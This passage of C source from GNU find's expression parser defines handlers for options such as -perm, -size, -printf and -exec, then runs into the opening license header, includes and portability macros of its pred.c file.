  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_iname);
  our_pred->need_stat = false;
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_inum (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_num (argv, arg_ptr, pred_inum));
}

static boolean
parse_ipath (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_ipath);
  our_pred->need_stat = false;
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_iregex (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return insert_regex (argv, arg_ptr, true);
}

static boolean
parse_links (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_num (argv, arg_ptr, pred_links));
}

static boolean
parse_lname (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_lname);
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_ls (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_ls);
  our_pred->side_effects = true;
  return (true);
}

static boolean
parse_maxdepth (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  int depth_len;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  depth_len = strspn (argv[*arg_ptr], "0123456789");
  if ((depth_len == 0) || (argv[*arg_ptr][depth_len] != '\0'))
    return (false);
  maxdepth = atoi (argv[*arg_ptr]);
  if (maxdepth < 0)
    return (false);
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_mindepth (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  int depth_len;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  depth_len = strspn (argv[*arg_ptr], "0123456789");
  if ((depth_len == 0) || (argv[*arg_ptr][depth_len] != '\0'))
    return (false);
  mindepth = atoi (argv[*arg_ptr]);
  if (mindepth < 0)
    return (false);
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_mmin (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  unsigned long num;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num_days (argv[*arg_ptr], &num, &c_type))
    return (false);
  our_pred = insert_primary (pred_mmin);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = cur_day_start + DAYSECS - num * 60;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_mtime (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_time (argv, arg_ptr, pred_mtime));
}

static boolean
parse_name (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_name);
  our_pred->need_stat = false;
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_negate (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred_chk_op ();
  our_pred->pred_func = pred_negate;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_negate);
#endif	/* DEBUG */
  our_pred->p_type = UNI_OP;
  our_pred->p_prec = NEGATE_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_newer (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  struct stat stat_newer;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if ((*xstat) (argv[*arg_ptr], &stat_newer))
    error (1, errno, "%s", argv[*arg_ptr]);
  our_pred = insert_primary (pred_newer);
  our_pred->args.time = stat_newer.st_mtime;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_noleaf (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  no_leaf_check = true;
  return true;
}

#ifdef CACHE_IDS
/* Arbitrary amount by which to increase size
   of `uid_unused' and `gid_unused'. */
#define ALLOC_STEP 2048

/* Boolean: if uid_unused[n] is nonzero, then UID n has no passwd entry. */
char *uid_unused = NULL;

/* Number of elements in `uid_unused'. */
unsigned uid_allocated;

/* Similar for GIDs and group entries. */
char *gid_unused = NULL;
unsigned gid_allocated;
#endif

static boolean
parse_nogroup (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_nogroup);
#ifdef CACHE_IDS
  if (gid_unused == NULL)
    {
      struct group *gr;

      gid_allocated = ALLOC_STEP;
      gid_unused = xmalloc (gid_allocated);
      memset (gid_unused, 1, gid_allocated);
      setgrent ();
      while ((gr = getgrent ()) != NULL)
	{
	  if ((unsigned) gr->gr_gid >= gid_allocated)
	    {
	      unsigned new_allocated = (unsigned) gr->gr_gid + ALLOC_STEP;
	      gid_unused = xrealloc (gid_unused, new_allocated);
	      memset (gid_unused + gid_allocated, 1,
		      new_allocated - gid_allocated);
	      gid_allocated = new_allocated;
	    }
	  gid_unused[(unsigned) gr->gr_gid] = 0;
	}
      endgrent ();
    }
#endif
  return (true);
}

static boolean
parse_nouser (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_nouser);
#ifdef CACHE_IDS
  if (uid_unused == NULL)
    {
      struct passwd *pw;

      uid_allocated = ALLOC_STEP;
      uid_unused = xmalloc (uid_allocated);
      memset (uid_unused, 1, uid_allocated);
      setpwent ();
      while ((pw = getpwent ()) != NULL)
	{
	  if ((unsigned) pw->pw_uid >= uid_allocated)
	    {
	      unsigned new_allocated = (unsigned) pw->pw_uid + ALLOC_STEP;
	      uid_unused = xrealloc (uid_unused, new_allocated);
	      memset (uid_unused + uid_allocated, 1,
		      new_allocated - uid_allocated);
	      uid_allocated = new_allocated;
	    }
	  uid_unused[(unsigned) pw->pw_uid] = 0;
	}
      endpwent ();
    }
#endif
  return (true);
}

static boolean
parse_ok (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_exec_ok (pred_ok, argv, arg_ptr));
}

boolean
parse_open (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred_chk_op ();
  our_pred->pred_func = pred_open;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_open);
#endif	/* DEBUG */
  our_pred->p_type = OPEN_PAREN;
  our_pred->p_prec = NO_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_or (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = get_new_pred ();
  our_pred->pred_func = pred_or;
#ifdef	DEBUG
  our_pred->p_name = find_pred_name (pred_or);
#endif	/* DEBUG */
  our_pred->p_type = BI_OP;
  our_pred->p_prec = OR_PREC;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_path (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_path);
  our_pred->need_stat = false;
  our_pred->args.str = argv[*arg_ptr];
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_perm (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  unsigned long perm_val;
  int mode_start = 0;
  struct mode_change *change;
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);

  switch (argv[*arg_ptr][0])
    {
    case '-':
    case '+':
      mode_start = 1;
      break;
    default:
      /* empty */
      break;
    }

  change = mode_compile (argv[*arg_ptr] + mode_start, MODE_MASK_PLUS);
  if (change == MODE_INVALID)
    error (1, 0, "invalid mode `%s'", argv[*arg_ptr]);
  else if (change == MODE_MEMORY_EXHAUSTED)
    error (1, 0, "virtual memory exhausted");
  perm_val = mode_adjust (0, change);
  mode_free (change);

  our_pred = insert_primary (pred_perm);

  switch (argv[*arg_ptr][0])
    {
    case '-':
      /* Set magic flag to indicate true if at least the given bits are set. */
      our_pred->args.perm = (perm_val & 07777) | 010000;
      break;
    case '+':
      /* Set magic flag to indicate true if any of the given bits are set. */
      our_pred->args.perm = (perm_val & 07777) | 020000;
      break;
    default:
      /* True if exactly the given bits are set. */
      our_pred->args.perm = (perm_val & 07777);
      break;
    }
  (*arg_ptr)++;
  return (true);
}

boolean
parse_print (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_print);
  /* -print has the side effect of printing.  This prevents us
     from doing undesired multiple printing when the user has
     already specified -print. */
  our_pred->side_effects = true;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_print0 (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_print0);
  /* -print0 has the side effect of printing.  This prevents us
     from doing undesired multiple printing when the user has
     already specified -print0. */
  our_pred->side_effects = true;
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_printf (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  return (insert_fprintf (stdout, pred_fprintf, argv, arg_ptr));
}

static boolean
parse_prune (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_prune);
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_regex (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return insert_regex (argv, arg_ptr, false);
}

static boolean
insert_regex (argv, arg_ptr, ignore_case)
     char *argv[];
     int *arg_ptr;
     boolean ignore_case;
{
  struct predicate *our_pred;
  struct re_pattern_buffer *re;
  const char *error_message;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  our_pred = insert_primary (pred_regex);
  our_pred->need_stat = false;
  re = (struct re_pattern_buffer *)
    xmalloc (sizeof (struct re_pattern_buffer));
  our_pred->args.regex = re;
  re->allocated = 100;
  re->buffer = (unsigned char *) xmalloc (re->allocated);
  re->fastmap = NULL;

  if (ignore_case)
    {
      unsigned i;
      
      re->translate = xmalloc (256);
      /* Map uppercase characters to corresponding lowercase ones.  */
      for (i = 0; i < 256; i++)
        re->translate[i] = ISUPPER (i) ? tolower (i) : i;
    }
  else
    re->translate = NULL;

  error_message = re_compile_pattern (argv[*arg_ptr], strlen (argv[*arg_ptr]),
				      re);
  if (error_message)
    error (1, 0, "%s", error_message);
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_size (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;
  unsigned long num;
  enum comparison_type c_type;
  int blksize = 512;
  int len;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  len = strlen (argv[*arg_ptr]);
  if (len == 0)
    error (1, 0, "invalid null argument to -size");
  switch (argv[*arg_ptr][len - 1])
    {
    case 'b':
      blksize = 512;
      argv[*arg_ptr][len - 1] = '\0';
      break;

    case 'c':
      blksize = 1;
      argv[*arg_ptr][len - 1] = '\0';
      break;

    case 'k':
      blksize = 1024;
      argv[*arg_ptr][len - 1] = '\0';
      break;

    case 'w':
      blksize = 2;
      argv[*arg_ptr][len - 1] = '\0';
      break;

    case '0':
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      break;

    default:
      error (1, 0, "invalid -size type `%c'", argv[*arg_ptr][len - 1]);
    }
  if (!get_num (argv[*arg_ptr], &num, &c_type))
    return (false);
  our_pred = insert_primary (pred_size);
  our_pred->args.size.kind = c_type;
  our_pred->args.size.blocksize = blksize;
  our_pred->args.size.size = num;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_true (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct predicate *our_pred;

  our_pred = insert_primary (pred_true);
  our_pred->need_stat = false;
  return (true);
}

static boolean
parse_type (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return insert_type (argv, arg_ptr, pred_type);
}

static boolean
parse_uid (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return (insert_num (argv, arg_ptr, pred_uid));
}

static boolean
parse_used (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;

{
  struct predicate *our_pred;
  unsigned long num_days;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num (argv[*arg_ptr], &num_days, &c_type))
    return (false);
  our_pred = insert_primary (pred_used);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = num_days * DAYSECS;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_user (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  struct passwd *cur_pwd;
  struct predicate *our_pred;
  uid_t uid;
  int uid_len;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  cur_pwd = getpwnam (argv[*arg_ptr]);
  endpwent ();
  if (cur_pwd != NULL)
    uid = cur_pwd->pw_uid;
  else
    {
      uid_len = strspn (argv[*arg_ptr], "0123456789");
      if ((uid_len == 0) || (argv[*arg_ptr][uid_len] != '\0'))
	return (false);
      uid = atoi (argv[*arg_ptr]);
    }
  our_pred = insert_primary (pred_user);
  our_pred->args.uid = uid;
  (*arg_ptr)++;
  return (true);
}

static boolean
parse_version (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  extern char *version_string;

  fflush (stderr);
  printf ("GNU find version %s\n", version_string);
  exit (0);
}

static boolean
parse_xdev (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  stay_on_filesystem = true;
  return true;
}

static boolean
parse_xtype (argv, arg_ptr)
     char *argv[];
     int *arg_ptr;
{
  return insert_type (argv, arg_ptr, pred_xtype);
}

static boolean
insert_type (argv, arg_ptr, which_pred)
     char *argv[];
     int *arg_ptr;
     boolean (*which_pred) ();
{
  unsigned long type_cell;
  struct predicate *our_pred;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL)
      || (strlen (argv[*arg_ptr]) != 1))
    return (false);
  switch (argv[*arg_ptr][0])
    {
    case 'b':			/* block special */
      type_cell = S_IFBLK;
      break;
    case 'c':			/* character special */
      type_cell = S_IFCHR;
      break;
    case 'd':			/* directory */
      type_cell = S_IFDIR;
      break;
    case 'f':			/* regular file */
      type_cell = S_IFREG;
      break;
#ifdef S_IFLNK
    case 'l':			/* symbolic link */
      type_cell = S_IFLNK;
      break;
#endif
#ifdef S_IFIFO
    case 'p':			/* pipe */
      type_cell = S_IFIFO;
      break;
#endif
#ifdef S_IFSOCK
    case 's':			/* socket */
      type_cell = S_IFSOCK;
      break;
#endif
    default:			/* None of the above ... nuke 'em. */
      return (false);
    }
  our_pred = insert_primary (which_pred);
  our_pred->args.type = type_cell;
  (*arg_ptr)++;			/* Move on to next argument. */
  return (true);
}

/* If true, we've determined that the current fprintf predicate
   uses stat information. */
static boolean fprintf_stat_needed;

static boolean
insert_fprintf (fp, func, argv, arg_ptr)
     FILE *fp;
     boolean (*func) ();
     char *argv[];
     int *arg_ptr;
{
  char *format;			/* Beginning of unprocessed format string. */
  register char *scan;		/* Current address in scanning `format'. */
  register char *scan2;		/* Address inside of element being scanned. */
  struct segment **segmentp;	/* Address of current segment. */
  struct predicate *our_pred;

  format = argv[(*arg_ptr)++];

  fprintf_stat_needed = false;	/* Might be overridden later. */
  our_pred = insert_primary (func);
  our_pred->side_effects = true;
  our_pred->args.printf_vec.stream = fp;
  segmentp = &our_pred->args.printf_vec.segment;
  *segmentp = NULL;

  for (scan = format; *scan; scan++)
    {
      if (*scan == '\\')
	{
	  scan2 = scan + 1;
	  if (*scan2 >= '0' && *scan2 <= '7')
	    {
	      register int n, i;

	      for (i = n = 0; i < 3 && (*scan2 >= '0' && *scan2 <= '7');
		   i++, scan2++)
		n = 8 * n + *scan2 - '0';
	      scan2--;
	      *scan = n;
	    }
	  else
	    {
	      switch (*scan2)
		{
		case 'a':
		  *scan = 7;
		  break;
		case 'b':
		  *scan = '\b';
		  break;
		case 'c':
		  make_segment (segmentp, format, scan - format, KIND_STOP);
		  our_pred->need_stat = fprintf_stat_needed;
		  return (true);
		case 'f':
		  *scan = '\f';
		  break;
		case 'n':
		  *scan = '\n';
		  break;
		case 'r':
		  *scan = '\r';
		  break;
		case 't':
		  *scan = '\t';
		  break;
		case 'v':
		  *scan = '\v';
		  break;
		case '\\':
		  /* *scan = '\\'; * it already is */
		  break;
		default:
		  error (0, 0, "warning: unrecognized escape `\\%c'", *scan2);
		  scan++;
		  continue;
		}
	    }
	  segmentp = make_segment (segmentp, format, scan - format + 1,
				   KIND_PLAIN);
	  format = scan2 + 1;	/* Move past the escape. */
	  scan = scan2;		/* Incremented immediately by `for'. */
	}
      else if (*scan == '%')
	{
	  if (scan[1] == '%')
	    {
	      segmentp = make_segment (segmentp, format, scan - format + 1,
				       KIND_PLAIN);
	      scan++;
	      format = scan + 1;
	      continue;
	    }
	  /* Scan past flags, width and precision, to verify kind. */
	  for (scan2 = scan; *++scan2 && strchr ("-+ #", *scan2);)
	    /* Do nothing. */ ;
	  while (ISDIGIT (*scan2))
	    scan2++;
	  if (*scan2 == '.')
	    for (scan2++; ISDIGIT (*scan2); scan2++)
	      /* Do nothing. */ ;
	  if (strchr ("abcdfFgGhHiklmnpPstuU", *scan2))
	    {
	      segmentp = make_segment (segmentp, format, scan2 - format,
				       (int) *scan2);
	      scan = scan2;
	      format = scan + 1;
	    }
	  else if (strchr ("ACT", *scan2) && scan2[1])
	    {
	      segmentp = make_segment (segmentp, format, scan2 - format,
				       *scan2 | (scan2[1] << 8));
	      scan = scan2 + 1;
	      format = scan + 1;
	      continue;
	    }
	  else
	    {
	      /* An unrecognized % escape.  Print the char after the %. */
	      error (0, 0, "warning: unrecognized format directive `%%%c'",
		     *scan2);
	      segmentp = make_segment (segmentp, format, scan - format,
				       KIND_PLAIN);
	      format = scan + 1;
	      continue;
	    }
	}
    }

  if (scan > format)
    make_segment (segmentp, format, scan - format, KIND_PLAIN);
  our_pred->need_stat = fprintf_stat_needed;
  return (true);
}

/* Create a new fprintf segment in *SEGMENT, with type KIND,
   from the text in FORMAT, which has length LEN.
   Return the address of the `next' pointer of the new segment. */

static struct segment **
make_segment (segment, format, len, kind)
     struct segment **segment;
     char *format;
     int len, kind;
{
  char *fmt;

  *segment = (struct segment *) xmalloc (sizeof (struct segment));

  (*segment)->kind = kind;
  (*segment)->next = NULL;
  (*segment)->text_len = len;

  fmt = (*segment)->text = xmalloc (len + 3);	/* room for "ld\0" */
  strncpy (fmt, format, len);
  fmt += len;

  switch (kind & 0xff)
    {
    case KIND_PLAIN:		/* Plain text string, no % conversion. */
    case KIND_STOP:		/* Terminate argument, no newline. */
      break;

    case 'a':			/* atime in `ctime' format */
    case 'c':			/* ctime in `ctime' format */
    case 'F':			/* filesystem type */
    case 'g':			/* group name */
    case 'l':			/* object of symlink */
    case 't':			/* mtime in `ctime' format */
    case 'u':			/* user name */
    case 'A':			/* atime in user-specified strftime format */
    case 'C':			/* ctime in user-specified strftime format */
    case 'T':			/* mtime in user-specified strftime format */
      fprintf_stat_needed = true;
      /* FALLTHROUGH */
    case 'f':			/* basename of path */
    case 'h':			/* leading directories part of path */
    case 'H':			/* ARGV element file was found under */
    case 'p':			/* pathname */
    case 'P':			/* pathname with ARGV element stripped */
      *fmt++ = 's';
      break;

    case 'b':			/* size in 512-byte blocks */
    case 'k':			/* size in 1K blocks */
    case 's':			/* size in bytes */
      *fmt++ = 'l';
      /*FALLTHROUGH*/
    case 'n':			/* number of links */
      fprintf_stat_needed = true;
      /* FALLTHROUGH */
    case 'd':			/* depth in search tree (0 = ARGV element) */
      *fmt++ = 'd';
      break;

    case 'i':			/* inode number */
      *fmt++ = 'l';
      /*FALLTHROUGH*/
    case 'G':			/* GID number */
    case 'U':			/* UID number */
      *fmt++ = 'u';
      fprintf_stat_needed = true;
      break;

    case 'm':			/* mode as octal number (perms only) */
      *fmt++ = 'o';
      fprintf_stat_needed = true;
      break;
    }
  *fmt = '\0';

  return (&(*segment)->next);
}

static boolean
insert_exec_ok (func, argv, arg_ptr)
     boolean (*func) ();
     char *argv[];
     int *arg_ptr;
{
  int start, end;		/* Indexes in ARGV of start & end of cmd. */
  int num_paths;		/* Number of args with path replacements. */
  int path_pos;			/* Index in array of path replacements. */
  int vec_pos;			/* Index in array of args. */
  struct predicate *our_pred;
  struct exec_val *execp;	/* Pointer for efficiency. */

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);

  /* Count the number of args with path replacements, up until the ';'. */
  start = *arg_ptr;
  for (end = start, num_paths = 0;
       (argv[end] != NULL)
       && ((argv[end][0] != ';') || (argv[end][1] != '\0'));
       end++)
    if (strstr (argv[end], "{}"))
      num_paths++;
  /* Fail if no command given or no semicolon found. */
  if ((end == start) || (argv[end] == NULL))
    {
      *arg_ptr = end;
      return (false);
    }

  our_pred = insert_primary (func);
  our_pred->side_effects = true;
  execp = &our_pred->args.exec_vec;
  execp->paths =
    (struct path_arg *) xmalloc (sizeof (struct path_arg) * (num_paths + 1));
  execp->vec = (char **) xmalloc (sizeof (char *) * (end - start + 1));
  /* Record the positions of all args, and the args with path replacements. */
  for (end = start, path_pos = vec_pos = 0;
       (argv[end] != NULL)
       && ((argv[end][0] != ';') || (argv[end][1] != '\0'));
       end++)
    {
      register char *p;
      
      execp->paths[path_pos].count = 0;
      for (p = argv[end]; *p; ++p)
	if (p[0] == '{' && p[1] == '}')
	  {
	    execp->paths[path_pos].count++;
	    ++p;
	  }
      if (execp->paths[path_pos].count)
	{
	  execp->paths[path_pos].offset = vec_pos;
	  execp->paths[path_pos].origarg = argv[end];
	  path_pos++;
	}
      execp->vec[vec_pos++] = argv[end];
    }
  execp->paths[path_pos].offset = -1;
  execp->vec[vec_pos] = NULL;

  if (argv[end] == NULL)
    *arg_ptr = end;
  else
    *arg_ptr = end + 1;
  return (true);
}

/* Get a number of days and comparison type.
   STR is the ASCII representation.
   Set *NUM_DAYS to the number of days, taken as being from
   the current moment (or possibly midnight).  Thus the sense of the
   comparison type appears to be reversed.
   Set *COMP_TYPE to the kind of comparison that is requested.

   Return true if all okay, false if input error.

   Used by -atime, -ctime and -mtime (parsers) to
   get the appropriate information for a time predicate processor. */

static boolean
get_num_days (str, num_days, comp_type)
     char *str;
     unsigned long *num_days;
     enum comparison_type *comp_type;
{
  int len_days;			/* length of field */

  if (str == NULL)
    return (false);
  switch (str[0])
    {
    case '+':
      *comp_type = COMP_LT;
      str++;
      break;
    case '-':
      *comp_type = COMP_GT;
      str++;
      break;
    case '0':
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      *comp_type = COMP_EQ;
      break;
    default:
      return (false);
    }

  /* We know the first char has been reasonable.  Find the
     number of days to play with. */
  len_days = strspn (str, "0123456789");
  if ((len_days == 0) || (str[len_days] != '\0'))
    return (false);
  *num_days = (unsigned long) atol (str);
  return (true);
}

/* Insert a time predicate PRED.
   ARGV is a pointer to the argument array.
   ARG_PTR is a pointer to an index into the array, incremented if
   all went well.

   Return true if input is valid, false if not.

   A new predicate node is assigned, along with an argument node
   obtained with malloc.

   Used by -atime, -ctime, and -mtime parsers. */

static boolean
insert_time (argv, arg_ptr, pred)
     char *argv[];
     int *arg_ptr;
     PFB pred;
{
  struct predicate *our_pred;
  unsigned long num_days;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num_days (argv[*arg_ptr], &num_days, &c_type))
    return (false);
  our_pred = insert_primary (pred);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = cur_day_start - num_days * DAYSECS
    + ((c_type == COMP_GT) ? DAYSECS - 1 : 0);
  (*arg_ptr)++;
#ifdef	DEBUG
  printf ("inserting %s\n", our_pred->p_name);
  printf ("    type: %s    %s  ",
	  (c_type == COMP_GT) ? "gt" :
	  ((c_type == COMP_LT) ? "lt" : ((c_type == COMP_EQ) ? "eq" : "?")),
	  (c_type == COMP_GT) ? " >" :
	  ((c_type == COMP_LT) ? " <" : ((c_type == COMP_EQ) ? ">=" : " ?")));
  printf ("%ld %s", our_pred->args.info.l_val,
	  ctime (&our_pred->args.info.l_val));
  if (c_type == COMP_EQ)
    {
      our_pred->args.info.l_val += DAYSECS;
      printf ("                 <  %ld %s", our_pred->args.info.l_val,
	      ctime (&our_pred->args.info.l_val));
      our_pred->args.info.l_val -= DAYSECS;
    }
#endif	/* DEBUG */
  return (true);
}

/* Get a number with comparision information.
   The sense of the comparision information is 'normal'; that is,
   '+' looks for inums or links > than the number and '-' less than.
   
   STR is the ASCII representation of the number.
   Set *NUM to the number.
   Set *COMP_TYPE to the kind of comparison that is requested.
 
   Return true if all okay, false if input error.

   Used by the -inum and -links predicate parsers. */

static boolean
get_num (str, num, comp_type)
     char *str;
     unsigned long *num;
     enum comparison_type *comp_type;
{
  int len_num;			/* Length of field. */

  if (str == NULL)
    return (false);
  switch (str[0])
    {
    case '+':
      *comp_type = COMP_GT;
      str++;
      break;
    case '-':
      *comp_type = COMP_LT;
      str++;
      break;
    case '0':
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      *comp_type = COMP_EQ;
      break;
    default:
      return (false);
    }

  /* We know the first char has been reasonable.  Find the number of
     days to play with. */
  len_num = strspn (str, "0123456789");
  if ((len_num == 0) || (str[len_num] != '\0'))
    return (false);
  *num = (unsigned long) atol (str);
  return (true);
}

/* Insert a number predicate.
   ARGV is a pointer to the argument array.
   *ARG_PTR is an index into ARGV, incremented if all went well.
   *PRED is the predicate processor to insert.

   Return true if input is valid, false if error.
   
   A new predicate node is assigned, along with an argument node
   obtained with malloc.

   Used by -inum and -links parsers. */

static boolean
insert_num (argv, arg_ptr, pred)
     char *argv[];
     int *arg_ptr;
     PFB pred;
{
  struct predicate *our_pred;
  unsigned long num;
  enum comparison_type c_type;

  if ((argv == NULL) || (argv[*arg_ptr] == NULL))
    return (false);
  if (!get_num (argv[*arg_ptr], &num, &c_type))
    return (false);
  our_pred = insert_primary (pred);
  our_pred->args.info.kind = c_type;
  our_pred->args.info.l_val = num;
  (*arg_ptr)++;
#ifdef	DEBUG
  printf ("inserting %s\n", our_pred->p_name);
  printf ("    type: %s    %s  ",
	  (c_type == COMP_GT) ? "gt" :
	  ((c_type == COMP_LT) ? "lt" : ((c_type == COMP_EQ) ? "eq" : "?")),
	  (c_type == COMP_GT) ? " >" :
	  ((c_type == COMP_LT) ? " <" : ((c_type == COMP_EQ) ? " =" : " ?")));
  printf ("%ld\n", our_pred->args.info.l_val);
#endif	/* DEBUG */
  return (true);
}

static FILE *
open_output_file (path)
     char *path;
{
  FILE *f;

  if (!strcmp (path, "/dev/stderr"))
    return (stderr);
  else if (!strcmp (path, "/dev/stdout"))
    return (stdout);
  f = fopen (path, "w");
  if (f == NULL)
    error (1, errno, "%s", path);
  return (f);
}
/* pred.c -- execute the expression tree.
   Copyright (C) 1990, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include <config.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fnmatch.h>
#include <signal.h>
#include <pwd.h>
#include <grp.h>
#include "defs.h"
#include "modetype.h"
#include "wait.h"

#if !defined(SIGCHLD) && defined(SIGCLD)
#define SIGCHLD SIGCLD
#endif

#ifndef _POSIX_VERSION
struct passwd *getpwuid ();
struct group *getgrgid ();
#endif

#if HAVE_DIRENT_H
# include <dirent.h>
# define NAMLEN(dirent) strlen((dirent)->d_name)
#else
# define dirent direct
# define NAMLEN(dirent) (dirent)->d_namlen
# if HAVE_SYS_NDIR_H
#  include <sys/ndir.h>
# endif
# if HAVE_SYS_DIR_H
#  include <sys/dir.h>
# endif
# if HAVE_NDIR_H
#  include <ndir.h>
# endif
#endif

#ifdef CLOSEDIR_VOID
/* Fake a return value. */
#define CLOSEDIR(d) (closedir (d), 0)
#else
#define CLOSEDIR(d) closedir (d)
#endif

#ifndef S_IFLNK
#define lstat stat
#endif

/* Extract or fake data from a `struct stat'.
   ST_NBLOCKS: Number of 512-byte blocks in the file
   (including indirect blocks).
   HP-UX, perhaps uniquely, counts st_blocks in 1024-byte units.
   This workaround loses when mixing HP-UX and 4BSD filesystems, though.  */
#ifdef _POSIX_SOURCE
# define ST_NBLOCKS(statp) (((statp)->st_size + 512 - 1) / 512)
#else
# ifndef HAVE_ST_BLOCKS
#  define ST_NBLOCKS(statp) (st_blocks ((statp)->st_size))
# else
#  if defined(hpux) || defined(__hpux__)
#   define ST_NBLOCKS(statp) ((statp)->st_blocks * 2)
#  else
#   define ST_NBLOCKS(statp) ((statp)->st_blocks)
#  endif
# endif
#endif

int lstat ();
int stat ();

